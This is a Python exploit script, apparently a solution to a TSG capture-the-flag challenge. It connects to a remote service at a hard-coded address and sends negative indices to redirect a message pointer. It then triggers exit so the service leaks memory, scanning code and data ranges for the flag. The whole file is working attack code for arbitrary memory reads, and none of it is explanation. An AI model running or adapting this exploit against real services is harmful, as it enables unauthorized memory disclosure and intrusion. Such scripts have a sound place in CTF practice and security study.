#!/usr/bin/env python3
"""
Scan memory ranges that don't cause crashes
"""
import socket
import time

def leak_address(addr):
    try:
        s = socket.socket()
        s.settimeout(8)
        s.connect(('34.84.25.24', 58554))
        
        # Point msg to address
        s.recv(4096)
        s.sendall(f"-22\n".encode())
        time.sleep(0.05)
        s.recv(4096)
        s.sendall(f"{addr & 0xFFFFFFFF}\n".encode())
        time.sleep(0.05)
        
        s.recv(4096)
        s.sendall(f"-21\n".encode())
        time.sleep(0.05)
        s.recv(4096)
        s.sendall(f"{addr >> 32}\n".encode())
        time.sleep(0.05)
        
        # Exit
        s.recv(4096)
        s.sendall(b"-1\n")
        time.sleep(0.3)
        
        output = s.recv(8192)
        s.close()
        return output
    except:
        return b''

print("[*] Scanning memory for flag...")

# Scan code sections
ranges = [
    (0x400000, 0x401000, 0x100, "Code section"),
    (0x600000, 0x602000, 0x100, "Data section"),
]

for start, end, step, name in ranges:
    print(f"\n[*] Scanning {name} ({hex(start)} - {hex(end)})...")
    
    for addr in range(start, end, step):
        output = leak_address(addr)
        
        if b'TSGCTF{' in output or b'TSG' in output:
            print(f"\n[+] FOUND at {hex(addr)}!")
            print(output.decode(errors='ignore'))
            
        if b'flag' in output.lower():
            print(f"\n[*] 'flag' string at {hex(addr)}")
            print(output[:200].decode(errors='ignore'))
        
        # Show non-crash addresses
        if output and b'Segmentation' not in output and len(output) > 50:
            print(f"  {hex(addr)}: {output[:80]}")
        
        time.sleep(0.1)

print("\n[*] Scan complete")
